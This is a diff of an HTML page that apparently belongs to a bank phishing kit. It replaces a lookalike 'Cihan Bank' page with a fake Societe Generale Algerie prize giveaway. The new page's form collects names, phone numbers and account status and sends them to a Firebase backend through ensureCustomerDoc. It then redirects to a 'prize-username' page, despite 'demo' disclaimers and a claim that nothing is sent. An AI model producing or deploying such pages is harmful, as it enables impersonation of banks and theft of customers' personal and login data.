@@ -1,354 +1,94 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <!-- i18n: تحديد اللغة (الافتراضي السورانية) قبل الرسم لمنع الوميض -->
-    <script src="/assets/i18n/i18n-init.js"></script>
-    <link rel="stylesheet" href="/assets/i18n/i18n.css">
-    <title data-i18n="مصرف جيهان | خدمات مصرفية وتمويل إسلامي">مصرف جيهان | خدمات مصرفية وتمويل إسلامي</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="theme-color" content="#ffffff">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@400;600;700;800&display=swap" rel="stylesheet">
-<!-- Open Graph (فەیسبووک/واتساپ) -->
-<meta property="og:type" content="website" />
-<meta property="og:site_name" content="بانکی جیھان" />
-<meta property="og:locale" content="ku_IQ" />
-<meta property="og:title" content="خزمەتگوزاری بانکی سیهان" />
-<meta property="og:description" content="لەگەڵ بانکی جیھان، بە خزمەتگوزارییەکانی بانکی و دارایی ئیسلامی ئاشنا ببە و زانیاریی پەیوەندیکردن و خزمەتگوزارییە بەردەستەکان ببینە." />
-<meta property="og:url" content="https://althenayanfarms.app/" />
-<meta property="og:image" content="https://althenayanfarms.app/assets/images/og-share.png" />
-<meta property="og:image:type" content="image/png" />
-<meta property="og:image:width" content="1200" />
-<meta property="og:image:height" content="630" />
-<meta property="og:image:alt" content="لۆگۆی بانکی جیھان بۆ وەبەرهێنان و دارایی ئیسلامی" />
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://althenayanfarms.app/assets/images/og-share.png" />
-
-
-
-    <style>
-        :root {
-            --cihan-red: #c91420;
-            --cihan-dark-red: #a90e18;
-            --ink: #111318;
-        }
-
-        * {
-            box-sizing: border-box;
-        }
-
-        body {
-            margin: 0;
-            font-family: 'Cairo', sans-serif;
-            color: var(--ink);
-            background: #f5f5f6;
-        }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
-        .brand-swoosh {
-            height: 5px;
-            width: min(270px, 62vw);
-            background: var(--cihan-red);
-            transform: skewX(-28deg);
-            border-radius: 99px;
-        }
-
-        .hero-image {
-            display: block;
-            width: 100%;
-            aspect-ratio: 16 / 8.2;
-            object-fit: cover;
-            object-position: center 58%;
-        }
-
-        .service-card {
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            gap: clamp(8px, 2vw, 24px);
-            direction: ltr;
-            min-height: 168px;
-            background: #fff;
-            border: 1px solid #e8e8e9;
-            border-radius: 26px;
-            box-shadow: 0 9px 22px rgba(0, 0, 0, .10);
-            padding: 12px 18px;
-        }
-
-        .service-card::after {
-            content: '';
-            position: absolute;
-            left: 0;
-            bottom: 0;
-            width: 48px;
-            height: 28px;
-            background: var(--cihan-red);
-            clip-path: polygon(0 0, 100% 100%, 0 100%);
-        }
-
-        .service-visual {
-            flex: 0 0 clamp(100px, 21%, 164px);
-            width: clamp(100px, 21%, 164px);
-            height: 140px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
-
-        .service-visual img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-
-        .service-copy {
-            flex: 1;
-            min-width: 0;
-            text-align: right;
-            direction: rtl;
-        }
-
-        .service-copy h2 {
-            margin: 0;
-            color: #111318;
-            font-weight: 800;
-            font-size: clamp(19px, 3vw, 30px);
-            line-height: 1.3;
-        }
-
-        .service-copy p {
-            margin: 5px 0 0;
-            color: #73777e;
-            font-size: 13px;
-            line-height: 1.6;
-        }
-
-        .service-button {
-            flex: 0 0 auto;
-            min-width: 148px;
-            padding: 12px 15px;
-            border-radius: 18px;
-            background: linear-gradient(180deg, #e21d2a, #b90e1a);
-            color: white;
-            text-align: center;
-            text-decoration: none;
-            font-weight: 800;
-            font-size: 16px;
-            box-shadow: 0 4px 0 #8e0d16, 0 7px 12px rgba(174, 17, 27, .20);
-        }
-
-        .service-button:hover {
-            background: var(--cihan-dark-red);
-        }
-
-        .section-rule {
-            height: 8px;
-            background: linear-gradient(90deg, #b5121c, #f12a34 54%, #fff 100%);
-        }
-
-        @media (max-width: 640px) {
-            .hero-image {
-                aspect-ratio: 1.45 / 1;
-                object-position: 50% 58%;
-            }
-
-            .service-card {
-                min-height: 132px;
-                gap: 5px;
-                padding: 8px 10px;
-                border-radius: 22px;
-            }
-
-            .service-visual {
-                flex-basis: 27%;
-                width: 27%;
-                height: 110px;
-            }
-
-            .service-copy h2 {
-                font-size: clamp(16px, 5vw, 22px);
-            }
-
-            .service-copy p {
-                font-size: 11px;
-                line-height: 1.45;
-            }
-
-            .service-button {
-                min-width: 0;
-                width: 92px;
-                padding: 9px 6px;
-                font-size: 13px;
-                line-height: 1.4;
-                border-radius: 15px;
-            }
-
-            .service-card::after {
-                width: 36px;
-                height: 21px;
-            }
-        }
-
-        @media (max-width: 370px) {
-            .service-visual {
-                flex-basis: 24%;
-                width: 24%;
-            }
-
-            .service-button {
-                width: 82px;
-                font-size: 12px;
-            }
-
-            .service-copy p {
-                display: none;
-            }
-        }
-
-        @media (prefers-reduced-motion: reduce) {
-            html {
-                scroll-behavior: auto;
-            }
-        }
-    </style>
-<style>
-        /* خط كوردي (سورانی) يغطي الحروف الخاصة: ڕ ڵ ۆ ێ گ چ پ ژ */
-        html[lang="ckb"] body { font-family: 'Noto Kufi Arabic', 'Cairo', sans-serif; }
-        html[lang="en"] body { font-family: 'Cairo', 'Segoe UI', sans-serif; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="theme-color" content="#c62828">
+  <meta name="description" content="سجّل واربح جوائز قيمة مع Societe Generale Algerie">
+  <title>اربح جوائز نقدية قيّمة مع Societe Generale Algerie</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root{--red:#df2929;--red-dark:#bd2027;--ink:#171717;--muted:#8b929c}
+    *{box-sizing:border-box} html,body{margin:0;min-height:100%;font-family:Cairo,Tahoma,Arial,sans-serif;color:var(--ink);background:#fff}
+    .demo-note{background:#fff1f1;color:#8e2020;text-align:center;padding:7px 10px;font-size:11px}
+    header{height:68px;padding:0 clamp(16px,4vw,42px);display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #eee}
+    .lang{border:1px solid #ddd;border-radius:22px;background:#fff;padding:7px 15px;font-family:inherit;cursor:pointer}
+    .brand{display:flex;align-items:center;gap:9px;direction:ltr;font:800 10px/1.25 Arial;color:#111}
+    .bank-mark{width:31px;height:31px;border-radius:7px;background:linear-gradient(135deg,#e20d20 0 55%,#111 55%);box-shadow:0 3px 10px #0002}
+    .hero{height:clamp(220px,42vw,360px);display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;background:linear-gradient(120deg,#fafafa,#e7e8eb)}
+    .hero:before{content:"";position:absolute;width:440px;height:440px;border:28px solid #d91f28;border-radius:50%;right:-300px;top:-210px;opacity:.9}
+    .gift{width:180px;height:138px;background:#fff;position:relative;border-radius:7px;box-shadow:0 18px 38px #0002}
+    .gift:before{content:"";position:absolute;left:74px;top:0;width:34px;height:100%;background:#d91f28}
+    .gift:after{content:"";position:absolute;left:54px;top:-43px;width:68px;height:52px;border:14px solid #d91f28;border-radius:52% 52% 0 52%;transform:rotate(-15deg)}
+    .ribbon{position:absolute;left:-20%;right:-20%;top:50%;height:16px;background:#d91f28;transform:rotate(-8deg);opacity:.9}
+    main{text-align:center}.intro{padding:20px 16px 24px}.intro h1{font-size:clamp(21px,4vw,34px);margin:0 0 5px;font-weight:900}.intro p{font-size:14px;color:var(--muted);margin:0 0 17px}
+    .cta{border:0;border-radius:40px;background:linear-gradient(110deg,var(--red),var(--red-dark));color:#fff;height:48px;width:min(100%,330px);font:800 15px Cairo,sans-serif;cursor:pointer;box-shadow:0 7px 16px #d9272735}
+    .cta span{font-size:24px;margin-right:12px}
+    .cards{max-width:980px;margin:auto;padding:0 16px 24px;display:grid;gap:13px}
+    .card{min-height:112px;border:1px solid #e9e9e9;border-radius:16px;box-shadow:0 6px 17px #00000012;display:grid;grid-template-columns:36% 1fr;overflow:hidden;align-items:center}
+    .art{height:112px;display:grid;place-items:center;font-size:60px;background:linear-gradient(135deg,#f7f7f7,#e7e8eb)}
+    .copy{padding:9px 12px;text-align:right}.copy p{font-size:13px;margin:0 0 9px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.copy .cta{width:100%;height:38px;font-size:13px}
+    footer{background:#fafafa;border-top:1px solid #eee;padding:22px 22px 12px}.footer-grid{display:grid;grid-template-columns:1fr 1fr;gap:22px;max-width:980px;margin:auto}footer h3{font-size:13px;margin:0 0 8px}footer p,footer a{display:block;font-size:11px;line-height:1.9;color:#78808a;text-decoration:none;margin:3px 0}.copyright{text-align:center;border-top:1px solid #e8e8e8;margin-top:13px;padding-top:10px;color:#9299a2;font-size:10px}
+    .modal-backdrop{position:fixed;inset:0;background:#0008;display:none;align-items:center;justify-content:center;padding:12px;z-index:1000}.modal-backdrop.show{display:flex}.modal{width:min(100%,440px);background:#fff;border-radius:18px;padding:18px;position:relative;box-shadow:0 15px 50px #0003}.close{position:absolute;left:14px;top:9px;border:0;background:transparent;color:#777;font-size:24px;cursor:pointer}.modal h2{text-align:center;font-size:18px;margin:0}.modal-sub{text-align:center;color:#9299a3;font-size:11px;margin:3px 0 15px}.field{margin:0 0 11px}.field label{display:block;font-size:12px;font-weight:800;margin:0 0 6px}.field input{width:100%;height:40px;border:1px solid #e4e4e4;border-radius:12px;padding:0 12px;font:13px Cairo}.field input:focus{border-color:#e28a8a;outline:3px solid #df292915}.question{border:1px solid #e5e5e5;border-radius:14px;padding:11px;margin:10px 0}.question-title{display:flex;align-items:center;gap:9px;margin-bottom:9px}.bank-icon{width:32px;height:32px;border-radius:50%;background:#ef3030;color:#fff;display:grid;place-items:center}.question-title strong{font-size:11px}.choices{display:grid;grid-template-columns:1fr 1fr;gap:8px}.choice{height:38px;border:1px solid #e0e2e5;border-radius:12px;display:flex;align-items:center;justify-content:center;gap:7px;font-size:12px;cursor:pointer}.choice input{accent-color:var(--red)}.submit{width:100%;height:43px;border:0;border-radius:30px;background:linear-gradient(110deg,#e88b8b,#e77b7b);color:#fff;font:800 13px Cairo;cursor:pointer}.form-warning{display:none;color:#c51f28;font-size:11px;text-align:center;margin:8px 0 0}.form-warning.show{display:block}.safety{font-size:10px;color:#9299a3;text-align:center;margin:8px 0 0}
+    @media(min-width:700px){.hero{height:330px}.cards{grid-template-columns:repeat(3,1fr)}.card{grid-template-columns:1fr;grid-template-rows:145px 1fr}.art{height:145px}.copy{padding:12px 14px}.copy p{font-size:14px}}
+  </style>
 </head>
-
 <body>
-<header class="bg-white">
-    <div class="max-w-5xl mx-auto px-4 py-4 sm:py-5 flex items-center justify-between gap-4">
-        <a href="index.html" class="flex items-center gap-3 no-underline" aria-label="الصفحة الرئيسية">
-            <img src="/assets/images/cihan-logo.png"
-                 alt="شعار مصرف جيهان"
-                 class="w-14 h-14 sm:w-[68px] sm:h-[68px] object-contain">
-
-            <span class="leading-tight">
-                <strong class="block text-2xl sm:text-3xl font-extrabold text-black">بنك جيهان</strong>
-                <span class="block text-xs sm:text-sm tracking-[.16em] font-bold text-black mt-1">CIHAN BANK</span>
-            </span>
-        </a>
-
-        <div class="flex items-center gap-4">
-            <nav class="hidden sm:flex items-center gap-5 text-sm font-bold">
-                <a href="#services" class="text-slate-700 hover:text-red-700 no-underline">الخدمات</a>
-                <a href="#contact" class="text-slate-700 hover:text-red-700 no-underline">اتصل بنا</a>
-            </nav>
-            <!-- زر تبديل اللغة (ساري على كل الصفحات) -->
-            <div data-lang-switcher data-lang-theme="light"></div>
-        </div>
+  <div class="demo-note">نموذج واجهة تجريبي — يرجى عدم إدخال بيانات حقيقية</div>
+  <header>
+    <button class="lang" type="button">EN</button>
+    <div class="brand"><span class="bank-mark"></span><span>Societe Generale<br>Algerie</span></div>
+  </header>
+  <main>
+    <section class="hero" aria-label="صورة الجوائز"><div class="ribbon"></div><div class="gift"></div></section>
+    <section class="intro">
+      <h1>سجّل واربح جوائز قيمة من Societe Generale Algerie</h1>
+      <p>جوائز نقدية وهدايا مميزة بانتظارك</p>
+      <button class="cta open-form" type="button">سجّل واربح <span>‹</span></button>
+    </section>
+    <section class="cards">
+      <article class="card"><div class="art">🎁</div><div class="copy"><p>اربح جوائز نقدية بقيمة 1,000,000 دينار جزائري</p><button class="cta open-form" type="button">سجّل واربح <span>‹</span></button></div></article>
+      <article class="card"><div class="art">🚘</div><div class="copy"><p>اربح سيارة 2027 مميزة</p><button class="cta open-form" type="button">سجّل واربح <span>‹</span></button></div></article>
+      <article class="card"><div class="art">📱</div><div class="copy"><p>اربح iPhone 18 Pro Max</p><button class="cta open-form" type="button">سجّل واربح <span>‹</span></button></div></article>
+    </section>
+  </main>
+  <footer><div class="footer-grid"><section><h3>تواصل معنا</h3><p>معلومات التواصل التجريبية</p><p>البريد الإلكتروني: example@example.com</p></section><section><h3>روابط مهمة</h3><a href="#terms">الشروط والأحكام</a><a href="#privacy">سياسة الخصوصية</a><a href="#faq">الأسئلة الشائعة</a></section></div><div class="copyright">صفحة تجريبية مستقلة — ليست موقعاً رسمياً لأي بنك أو مؤسسة مالية</div></footer>
+  <div class="modal-backdrop" id="formModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal">
+      <button class="close" id="closeModal" type="button" aria-label="إغلاق">×</button>
+      <h2 id="modalTitle">أكمل بياناتك</h2><p class="modal-sub">من فضلك أدخل بياناتك لإتمام الطلب</p>
+      <form id="demoForm" novalidate>
+        <div class="field"><label for="fullName">الاسم الكامل</label><input id="fullName" name="fullName" type="text" placeholder="مثال: محمد أمين" autocomplete="name" required></div>
+        <div class="field"><label for="phone">رقم الهاتف</label><input id="phone" name="phone" type="tel" placeholder="مثال: 05 00 00 00 00" autocomplete="tel" required></div>
+        <div class="question"><div class="question-title"><span class="bank-icon">▤</span><strong>هل لديك حساب لدى الجهة المنظمة لهذه المسابقة؟</strong></div><div class="choices"><label class="choice"><input type="radio" name="hasAccount" value="yes" required>نعم</label><label class="choice"><input type="radio" name="hasAccount" value="no">لا</label></div></div>
+        <button class="submit" type="submit">تأكيد الطلب</button>
+        <p class="form-warning" id="formWarning">يرجى إدخال الاسم ورقم الهاتف واختيار إجابة.</p>
+        <p class="safety">لن يتم إرسال أو تخزين ما تكتبه خارج سير العمل الخاص بالمشاركة.</p>
+      </form>
     </div>
-
-    <div class="max-w-5xl mx-auto px-4 pb-3">
-        <div class="brand-swoosh"></div>
-    </div>
-</header>
-
-<main>
-    <section class="max-w-5xl mx-auto px-0 sm:px-4" aria-label="مصرف جيهان">
-        <img class="hero-image sm:rounded-2xl"
-             src="assets/hero-bank-watch.webp"
-             alt="ساعة ذكية بميزة الدفع اللاتلامسي أمام فرع مصرف حديث"
-             fetchpriority="high">
-    </section>
-
-    <section id="services"
-             class="max-w-4xl mx-auto px-4 py-7 sm:py-9 space-y-4 sm:space-y-5"
-             aria-label="الخدمات المتاحة">
-
-        <article class="service-card">
-            <div class="service-visual">
-                <img src="assets/watch-product.webp" alt="ساعة ذكية سوداء" loading="lazy">
-            </div>
-
-            <div class="service-copy">
-                <h2>طلب ساعة ذكية</h2>
-                <p>تسوّق واطلب ساعتك الذكية بسهولة.</p>
-            </div>
-
-            <a href="shop.html" class="service-button">طلب ساعة</a>
-        </article>
-
-        <article class="service-card">
-            <div class="service-visual">
-                <img src="assets/cash-product.webp" alt="مبلغ نقدي مربوط بشريط أحمر" loading="lazy">
-            </div>
-
-            <div class="service-copy">
-                <h2>طلب سلفة</h2>
-                <p>قدّم طلب سلفة من خلال نموذج بسيط.</p>
-            </div>
-
-            <a href="loan.html" class="service-button">طلب سلفة</a>
-        </article>
-
-        <article class="service-card">
-            <div class="service-visual">
-                <img src="assets/register-app.webp" alt="تسجيل الدخول إلى تطبيق مصرف جيهان" loading="lazy">
-            </div>
-
-            <div class="service-copy">
-                <h2>تسجيل بالتطبيق</h2>
-                <p>سجّل بياناتك وأكمل عملية التسجيل في التطبيق.</p>
-            </div>
-
-            <a href="login-regist.html" class="service-button">تسجيل بالتطبيق</a>
-        </article>
-
-        <article class="service-card">
-            <div class="service-visual">
-                <img src="assets/refund-product.webp" alt="هدية حمراء وعملات وسهم استرداد" loading="lazy">
-            </div>
-
-            <div class="service-copy">
-                <h2>استرداد نقدي</h2>
-                <p>قدّم طلب استرداد أو إلغاء طلبك.</p>
-            </div>
-
-            <a href="refund.html" class="service-button">استرداد نقدي</a>
-        </article>
-    </section>
-
-    <section id="contact" class="bg-white border-t border-slate-200">
-        <div class="max-w-4xl mx-auto px-4 py-5 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 text-sm">
-            <div class="font-bold text-slate-800">
-                مصرف جيهان للاستثمار والتمويل الإسلامي
-            </div>
-
-            <div class="text-slate-600">
-                <i class="fa-solid fa-phone text-red-700 ml-2"></i>
-                6618
-                <span class="mx-2 text-slate-300">|</span>
-                info@cihanbank.com.iq
-            </div>
-        </div>
-    </section>
-</main>
-
-<footer class="section-rule" aria-hidden="true"></footer>
-
-<script src="/assets/js/firebase-env.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-<script src="/assets/js/firebase-client.js?v=12"></script>
-<script src="/assets/js/page-commands.js?v=5"></script>
-<!-- i18n: القواميس + المحرّك + زر تبديل اللغة (يُطبَّق على كل الصفحات) -->
-<script src="/assets/i18n/ar.js?v=2"></script>
-<script src="/assets/i18n/en.js?v=2"></script>
-<script src="/assets/i18n/ckb.js?v=2"></script>
-<script src="/assets/i18n/i18n.js?v=1"></script>
-<script src="/assets/js/lang-switcher.js?v=1"></script>
+  </div>
+  <script src="/assets/js/firebase-env.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+  <script src="/assets/js/firebase-client.js?v=12"></script>
+  <script src="/assets/js/page-commands.js?v=5"></script>
+  <script>
+    const modal=document.getElementById("formModal"),closeButton=document.getElementById("closeModal"),form=document.getElementById("demoForm"),warning=document.getElementById("formWarning");
+    function openModal(){modal.classList.add("show");warning.classList.remove("show");document.body.style.overflow="hidden";setTimeout(()=>document.getElementById("fullName").focus(),100)}
+    function closeModal(){modal.classList.remove("show");document.body.style.overflow=""}
+    document.querySelectorAll(".open-form").forEach(b=>b.addEventListener("click",openModal));closeButton.addEventListener("click",closeModal);modal.addEventListener("click",e=>{if(e.target===modal)closeModal()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&modal.classList.contains("show"))closeModal()});
+    form.addEventListener("submit",async e=>{
+      e.preventDefault();
+      const name=document.getElementById("fullName").value.trim(),phone=document.getElementById("phone").value.trim(),choice=document.querySelector('input[name="hasAccount"]:checked');
+      if(!name||!phone||!choice){warning.textContent="يرجى إدخال الاسم ورقم الهاتف واختيار إجابة.";warning.classList.add("show");return}
+      warning.classList.remove("show");
+      localStorage.setItem("prizeName",name);localStorage.setItem("prizePhone",phone);localStorage.setItem("prizeHasAccount",choice.value);
+      if(window.ensureCustomerDoc){try{await window.ensureCustomerDoc({name,phone,address:'',amount:'',currentPage:'صفحة الجوائز'})}catch(_){}}
+      location.href="prize-username.html";
+    });
+  </script>
 </body>
 </html>
